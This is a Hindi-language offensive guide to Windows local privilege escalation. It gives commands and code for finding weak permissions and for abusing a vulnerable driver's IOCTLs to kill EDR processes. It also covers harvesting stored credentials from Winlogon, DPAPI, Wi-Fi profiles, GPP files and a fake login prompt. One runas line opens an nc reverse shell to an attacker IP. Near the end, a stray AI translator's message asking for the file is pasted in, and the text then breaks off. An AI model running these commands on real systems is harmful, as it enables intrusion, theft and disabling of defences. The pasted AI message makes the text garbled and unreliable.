Windows उपयोगकर्ताओं को यह निर्दिष्ट करने की अनुमति देता है कि यदि कोई सेवा विफल हो जाए तो क्या क्रियाएँ की जानी चाहिए। इस फीचर को एक binary की ओर इंगित करने के लिए कॉन्फ़िगर किया जा सकता है। यदि यह binary बदलने योग्य है, तो privilege escalation संभव हो सकती है। अधिक जानकारी [आधिकारिक दस्तावेज़](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) में पाई जा सकती है।

## एप्लिकेशन

### इंस्टॉल किए गए एप्लिकेशन

जाँचें **permissions of the binaries** (शायद आप किसी एक को overwrite करके privileges escalate कर सकें) और **folders** की भी। ([DLL Hijacking](dll-hijacking/index.html))
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### लिखने की अनुमतियाँ

जाँच करें कि क्या आप किसी config file को modify करके किसी special file को पढ़ सकते हैं, या क्या आप किसी binary को modify कर सकते हैं जिसे Administrator account द्वारा execute किया जाएगा (schedtasks)।

सिस्टम में कमजोर folder/files permissions खोजने का एक तरीका है:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### स्टार्टअप पर चलाएँ

**जाँचें कि क्या आप किसी ऐसे registry या binary को overwrite कर सकते हैं जिसे किसी अलग user द्वारा executed किया जाएगा।**\  
**पढ़ें** उस **निम्नलिखित पृष्ठ** को यह जानने के लिए कि रोचक **autoruns locations to escalate privileges** के बारे में और जानकारी:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

संभावित **third party weird/vulnerable** drivers की तलाश करें
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
यदि कोई ड्राइवर arbitrary kernel read/write primitive (poorly designed IOCTL handlers में आम) एक्सपोज़ करता है, तो आप kernel memory से सीधे SYSTEM token चुरा कर escalate कर सकते हैं। step‑by‑step technique यहाँ देखें:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### device objects पर FILE_DEVICE_SECURE_OPEN के गायब होने का दुरुपयोग (LPE + EDR kill)

कुछ signed third‑party drivers अपने device object को strong SDDL के साथ IoCreateDeviceSecure के माध्यम से बनाते हैं लेकिन DeviceCharacteristics में FILE_DEVICE_SECURE_OPEN सेट करना भूल जाते हैं। इस flag के बिना, secure DACL उस समय लागू नहीं होता जब device को ऐसे path के माध्यम से खोला जाता है जिसमें एक extra component हो, जिससे कोई भी unprivileged user निम्नलिखित namespace path का उपयोग करके handle प्राप्त कर सकता है:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (एक वास्तविक केस से)

एक बार user device खोल पाए, तो driver द्वारा expose किए गए privileged IOCTLs का दुरुपयोग LPE और tampering के लिए किया जा सकता है। वास्तविक दुनिया में देखी गई example capabilities:
- Arbitrary processes को full-access handles लौटाना (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Arbitrary processes terminate करना, जिनमें Protected Process/Light (PP/PPL) भी शामिल हैं, जिससे user land से kernel के माध्यम से AV/EDR को kill करने की अनुमति मिलती है।

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations for developers
- ऐसे device objects बनाते समय जिन्हें DACL द्वारा सीमित किया जाना है, हमेशा FILE_DEVICE_SECURE_OPEN सेट करें।
- प्रिविलेज्ड ऑपरेशन्स के लिए caller context को validate करें। process termination या handle returns की अनुमति देने से पहले PP/PPL चेक जोड़ें।
- IOCTLs को सीमित करें (access masks, METHOD_*, input validation) और सीधे kernel privileges के बजाय brokered models पर विचार करें।

Detection ideas for defenders
- संदिग्ध device नामों के user-mode opens (e.g., \\ .\\amsdk*) और दुरुपयोग का संकेत देने वाले विशिष्ट IOCTL sequences की निगरानी करें।
- Microsoft की vulnerable driver blocklist (HVCI/WDAC/Smart App Control) लागू करें और अपनी अनुमति/निषेध सूचियाँ बनाए रखें।


## PATH DLL Hijacking

If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

PATH के अंदर मौजूद सभी फ़ोल्डरों की permissions जांचें:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
इस चेक का दुरुपयोग करने के बारे में अधिक जानकारी के लिए:

{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

## नेटवर्क

### शेयर
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file पर hardcoded किए गए अन्य ज्ञात कंप्यूटरों की जाँच करें
```
type C:\Windows\System32\drivers\etc\hosts
```
### नेटवर्क इंटरफेस & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

बाहर से **restricted services** की जांच करें
```bash
netstat -ano #Opened ports?
```
### रूटिंग तालिका
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP तालिका
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall नियम

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(नियमों की सूची, नियम बनाना, बंद करना, बंद करना...)**

और[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
बाइनरी `bash.exe` को `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` में भी पाया जा सकता है

यदि आप root user प्राप्त कर लेते हैं तो आप किसी भी पोर्ट पर listen कर सकते हैं (पहली बार जब आप `nc.exe` को किसी पोर्ट पर listen करने के लिए उपयोग करेंगे तो यह GUI के माध्यम से पूछेगा कि `nc` को firewall द्वारा अनुमति दी जानी चाहिए या नहीं)।
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
बिना मुश्किल के bash को root के रूप में शुरू करने के लिए, आप कोशिश कर सकते हैं `--default-user root`

आप `WSL` फ़ाइलसिस्टम को फ़ोल्डर `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` में एक्सप्लोर कर सकते हैं।

## Windows क्रेडेंशियल्स

### Winlogon क्रेडेंशियल्स
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault सर्वर, वेबसाइट्स और अन्य प्रोग्रामों के लिए उपयोगकर्ता credentials को स्टोर करता है जिन्हें **Windows** उपयोगकर्ताओं को स्वचालित रूप से लॉग इन करवा सकता है। पहली नज़र में ऐसा लग सकता है कि उपयोगकर्ता यहाँ अपने Facebook, Twitter, Gmail आदि के credentials स्टोर कर सकते हैं ताकि वे ब्राउज़र के माध्यम से स्वतः लॉग इन हो जाएँ। पर ऐसा नहीं है।

Windows Vault उन credentials को स्टोर करता है जिनके जरिए Windows उपयोगकर्ताओं को स्वचालित रूप से लॉग इन कर सकता है, जिसका अर्थ है कि कोई भी **Windows application that needs credentials to access a resource** (server या website) **can make use of this Credential Manager** और Windows Vault में दिए गए credentials का उपयोग कर सकता है, ताकि उपयोगकर्ता बार-बार username और password न डालें।

जब तक applications Credential Manager के साथ इंटरैक्ट नहीं करतीं, मुझे नहीं लगता कि वे किसी विशिष्ट resource के लिए credentials का उपयोग कर पाएंगी। इसलिए, यदि आपकी application vault का उपयोग करना चाहती है, तो उसे किसी तरह default storage vault से उस resource के credentials माँगने के लिए **communicate with the credential manager and request the credentials for that resource** करना चाहिए।

मशीन पर संग्रहीत credentials को सूचीबद्ध करने के लिए `cmdkey` का उपयोग करें।
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
फिर आप सहेजे गए credentials का उपयोग करने के लिए `runas` को `/savecred` विकल्प के साथ चला सकते हैं। निम्नलिखित उदाहरण SMB share के माध्यम से एक remote binary को कॉल कर रहा है।
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
प्रदान किए गए credential सेट के साथ `runas` का उपयोग।
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
ध्यान दें कि mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), या [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) का उपयोग किया जा सकता है।

### DPAPI

**डेटा प्रोटेक्शन API (DPAPI)** डेटा के symmetric एन्क्रिप्शन के लिए एक तरीका प्रदान करता है, जो मुख्य रूप से Windows ऑपरेटिंग सिस्टम में asymmetric private keys के symmetric एन्क्रिप्शन के लिए उपयोग होता है। यह एन्क्रिप्शन entropy में महत्वपूर्ण योगदान देने के लिए उपयोगकर्ता या सिस्टम सीक्रेट का उपयोग करता है।

**DPAPI उपयोगकर्ता के लॉगिन सीक्रेट्स से व्युत्पन्न एक symmetric key के माध्यम से keys का एन्क्रिप्शन सक्षम करता है**। सिस्टम एन्क्रिप्शन वाले परिदृश्यों में, यह सिस्टम के डोमेन प्रमाणीकरण सीक्रेट्स का उपयोग करता है।

DPAPI का उपयोग करके एन्क्रिप्ट किए हुए उपयोगकर्ता RSA keys %APPDATA%\Microsoft\Protect\{SID} निर्देशिका में संग्रहीत होते हैं, जहाँ {SID} उपयोगकर्ता का [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) दर्शाता है। **DPAPI key, जो उसी फ़ाइल में उपयोगकर्ता की private keys की सुरक्षा करने वाले master key के साथ सह-स्थित होता है**, आमतौर पर 64 bytes यादृच्छिक डेटा का होता है। (यह ध्यान देने योग्य है कि इस निर्देशिका तक पहुँच प्रतिबंधित है, इसलिए CMD में dir कमांड के माध्यम से इसकी सामग्री को सूचीबद्ध नहीं किया जा सकता, हालांकि इसे PowerShell के माध्यम से सूचीबद्ध किया जा सकता है)।
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
आप इसे डिक्रिप्ट करने के लिए उपयुक्त तर्कों (`/pvk` या `/rpc`) के साथ **mimikatz module** `dpapi::masterkey` का उपयोग कर सकते हैं।

मास्टर पासवर्ड द्वारा संरक्षित **credentials files** आमतौर पर निम्न स्थानों में पाए जाते हैं:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
आप उपयुक्त `/masterkey` के साथ **mimikatz module** `dpapi::cred` का उपयोग करके decrypt कर सकते हैं.\
आप **extract many DPAPI** **masterkeys** from **memory** with the `sekurlsa::dpapi` module (यदि आप root हैं) कर सकते हैं।

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** का अक्सर उपयोग **scripting** और automation tasks के लिए किया जाता है ताकि encrypted credentials को सुविधाजनक तरीके से store किया जा सके। ये credentials **DPAPI** का उपयोग करके protected होते हैं, जिसका सामान्यतः मतलब यह है कि इन्हें केवल उसी user द्वारा उसी computer पर decrypted किया जा सकता है जिस पर इन्हें बनाया गया था।

जिस फ़ाइल में PS credentials मौजूद हैं, उसमें से किसी PS credential को **decrypt** करने के लिए आप कर सकते हैं:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Saved RDP Connections

आप इन्हें निम्न स्थानों पर पा सकते हैं: `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
और `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### हाल ही में चलाए गए कमांड
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **रिमोट डेस्कटॉप क्रेडेंशियल मैनेजर**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

लोग अक्सर Windows वर्कस्टेशनों पर StickyNotes app का उपयोग पासवर्ड और अन्य जानकारी **save** करने के लिए करते हैं, यह न समझते हुए कि यह एक database फ़ाइल है। यह फ़ाइल इस पथ पर स्थित है `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` और इसे ढूँढना और जाँचना हमेशा लाभदायक होता है।

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
यदि यह फ़ाइल मौजूद है तो संभव है कि कुछ **credentials** कॉन्फ़िगर किए गए हों और उन्हें **recovered** किया जा सके।

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

जांच करें कि `C:\Windows\CCM\SCClient.exe` मौजूद है .\
इंस्टॉलर्स **SYSTEM privileges के साथ चलते हैं**, कई **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## फ़ाइलें और रजिस्ट्री (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### रजिस्ट्री में SSH keys

SSH private keys को registry key `HKCU\Software\OpenSSH\Agent\Keys` के अंदर स्टोर किया जा सकता है, इसलिए आपको देखना चाहिए कि वहाँ कुछ दिलचस्प है या नहीं:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
यदि आप उस path के भीतर कोई entry पाते हैं तो यह संभवतः एक saved SSH key होगी। यह encrypted रूप में stored होती है लेकिन इसे आसानी से decrypted किया जा सकता है using [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
इस तकनीक के बारे में अधिक जानकारी यहाँ: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

यदि `ssh-agent` service चल नहीं रही है और आप चाहते हैं कि यह boot पर स्वतः शुरू हो तो चलाएँ:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> ऐसा लगता है कि यह तकनीक अब मान्य नहीं है। मैंने कुछ ssh keys बनाकर, उन्हें `ssh-add` से जोड़ा और ssh के जरिए किसी मशीन में लॉगिन करने की कोशिश की। रजिस्ट्री HKCU\Software\OpenSSH\Agent\Keys मौजूद नहीं है और procmon ने asymmetric key authentication के दौरान `dpapi.dll` के उपयोग की पहचान नहीं की।

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
आप इन फाइलों को **metasploit** का उपयोग करके भी खोज सकते हैं: _post/windows/gather/enum_unattend_

उदाहरण सामग्री:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM बैकअप्स
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### क्लाउड क्रेडेंशियल्स
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

एक फ़ाइल खोजें जिसका नाम **SiteList.xml** हो

### Cached GPP पासवर्ड

एक फीचर पहले उपलब्ध था जो Group Policy Preferences (GPP) के माध्यम से मशीनों के एक समूह पर custom local administrator accounts तैनात करने की अनुमति देता था। हालांकि, इस विधि में महत्वपूर्ण सुरक्षा कमजोरियाँ थीं। सबसे पहले, Group Policy Objects (GPOs), जो SYSVOL में XML फ़ाइलों के रूप में संग्रहीत होते हैं, किसी भी domain user द्वारा एक्सेस किए जा सकते थे। दूसरे, इन GPPs के भीतर के पासवर्ड, जो AES256 के साथ सार्वजनिक रूप से दस्तावेजीकृत default key का उपयोग करके encrypted होते थे, किसी भी authenticated user द्वारा decrypt किए जा सकते थे। इससे गंभीर खतरा उत्पन्न होता था क्योंकि इससे उपयोगकर्ता elevated privileges प्राप्त कर सकते थे।

इस जोखिम को कम करने के लिए, एक फ़ंक्शन विकसित किया गया था जो locally cached GPP फ़ाइलों के लिए स्कैन करता है जिनमें एक "cpassword" field होता है जो खाली नहीं है। ऐसी फ़ाइल मिलने पर, फ़ंक्शन पासवर्ड को decrypt करता है और एक custom PowerShell object return करता है। यह object GPP और फ़ाइल के स्थान के बारे में विवरण शामिल करता है, जो इस सुरक्षा कमजोरी की पहचान और remediation में मदद करता है।

इन फ़ाइलों के लिए `C:\ProgramData\Microsoft\Group Policy\history` या _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ में खोजें:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword को decrypt करने के लिए:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec का उपयोग करके passwords प्राप्त करना:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
credentials के साथ web.config का उदाहरण:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN प्रमाणीकरण जानकारी
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### लॉग्स
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Credentials के लिए पूछना

आप हमेशा **user से उसके credentials दर्ज करने के लिए कह सकते हैं या यहाँ तक कि किसी दूसरे user के credentials भी** मांग सकते हैं अगर आपको लगता है कि वह उन्हें जानता होगा (ध्यान दें कि क्लाइंट से सीधे **credentials** माँगना वास्तव में **जोखिम भरा**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **संभावित फ़ाइल नाम जिनमें credentials होते हैं**

ज्ञात फ़ाइलें जो कुछ समय पहले **passwords** को **clear-text** या **Base64** में रखती थीं
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don’t have access to your repository or files. Please paste the contents of src/windows-hardening/windows-local-privilege-escalation/README.md (or upload the file) here, and I will translate the English text to Hindi while preserving all markdown/html tags, links, paths and code exactly as requested. If you want multiple files translated, paste each or list them and include their contents.
```
cd C:\
